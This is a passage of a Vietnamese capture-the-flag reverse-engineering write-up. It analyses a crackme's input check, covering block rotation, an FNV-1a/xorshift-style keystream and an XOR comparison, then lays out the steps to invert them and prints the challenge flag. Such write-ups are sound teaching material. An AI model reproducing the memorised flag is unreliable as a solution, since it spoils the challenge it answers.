**3. Xoay theo block 4 byte**

- Ngay sau khi encode đủ 60 ký tự, chương trình xoay từng block 4 byte của enc và ghi đè lại vào vùng rlimits

```C++
v30 = 1;
do {
  v31 = v30;            // 1, 4, 7, 10, ...
  v30 += 3;
  // chọn thứ tự byte theo (v31 & 3)
  *(_DWORD*)((char*)&rlimits[0].sa_handler + v29) =
    v32[(v31&3)-512]           |
    (v32[(((v31&3)+1)&3)-512] << 8) |
    (v32[(((v31&3)+2)&3)-512] << 16)|
    (v32[(((v31&3)+3)&3)-512] << 24);
  v29 += 4;
} while (v30 != 46);

```

- Mỗi block 4 ký tự bị xoay trái với lượng dịch theo chu kỳ [1,0,3,2]
- Gọi chuỗi sau xoay là enc_rot[60]

**4. Keystream 60 byte**

- Tiếp theo, vòng for (j=0; j!=60; ++j) sinh một keystream rồi so sánh. Keystream xuất phát từ:

FNV-1a 32-bit trên chuỗi hằng "n0*dbg^*^":

![](/assets/data/2025-09-22-22-19-07.png)

Mỗi bước sinh số mới kiểu “xorshift-ish”:
![](/assets/data/2025-09-22-22-19-29.png)
Cộng thêm 1 byte lấy từ chuỗi "n0*dbg^*^" theo chỉ số phụ thuộc j:
![](/assets/data/2025-09-22-22-19-41.png)

- Công thức trong code có vẻ rối nhưng thực tế tương đương "n0*dbg^*^"[ j % 9 ] (chạy tuần hoàn 0->8)

* Gọi mảng keystream 60 byte là KS[60] (lấy v39 & 0xFF từng vòng).

**5. So sánh quyết định pass/fail**

- Mảng hằng 60 byte trong .rodata (tên decompile: byte_2220) được XOR với enc_rot rồi so với KS:

```C++
v40 = byte_2220[j] ^ enc_rot[j];
v37 |= (v40 ^ v39);      // tích luỹ sai khác
...
if (v37 == 0) Correct; else Nope;

```

- Điều kiện đúng trong vòng for:

```C++
byte_2220[j] ^ enc_rot[j] == KS[j]
⇔ enc_rot[j] = byte_2220[j] ^ KS[j]

```

**6. Đảo ngược để lấy flag**

- Từ (5), ta có thể tự tạo `enc_rot` vì byte_2220 và cách sinh KS đều biết được

1. Trích `C = byte_2220[60]` từ .rodata.
2. Tự sinh KS[60] bằng FNV-1a + bước `xorshift-ish` + cộng `n0*dbg^*^"[j%9]`
3. Tính `enc_rot = C ^ KS` (XOR từng byte).
4. Khử xoay block 4-byte theo chu kỳ [1,0,3,2] (ngược với bước 3):
5. Vì chương trình đã xoay trái lượng [1,0,3,2], nên để phục hồi enc, ta xoay phải mỗi block với lượng tương ứng [1,0,3,2].
6. Lúc này enc là chuỗi 60 ký tự trong bảng `QWERTY-Base64` (và . là padding). Giải mã theo bảng đó ⇒ thu plaintext chính là flag.

```
flag: PTITCTF{Y0u_c4n_bypass_4ll_types_0f_4nt1!!!}
```
